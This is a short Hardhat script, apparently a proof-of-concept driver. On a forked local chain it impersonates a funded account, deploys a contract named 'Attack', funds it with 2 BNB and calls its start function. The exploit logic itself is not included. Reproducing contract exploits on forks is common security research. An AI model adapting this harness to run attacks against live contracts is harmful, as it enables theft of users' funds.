// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers, network } = require("hardhat");
const hre = require("hardhat");

async function main() {

  const sender = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
  [add1] = await ethers.getSigners();
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [sender],
  });
 
  const signer = await ethers.provider.getSigner(sender);
  const Test = await ethers.getContractFactory("Attack");
  const test = await Test.deploy();
  await test.deployed();
  // 用模拟的账户给指定账户转账
  await signer.sendTransaction({
    to: test.address,
    value: ethers.utils.parseEther("2.0"),
  });
  console.log('向合约地址转账2BNB')
  await test.start();
    // 取消模拟
  await hre.network.provider.request({
    method: "hardhat_stopImpersonatingAccount",
    params: [sender],
  });

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});


// npx hardhat run scripts/attack.js 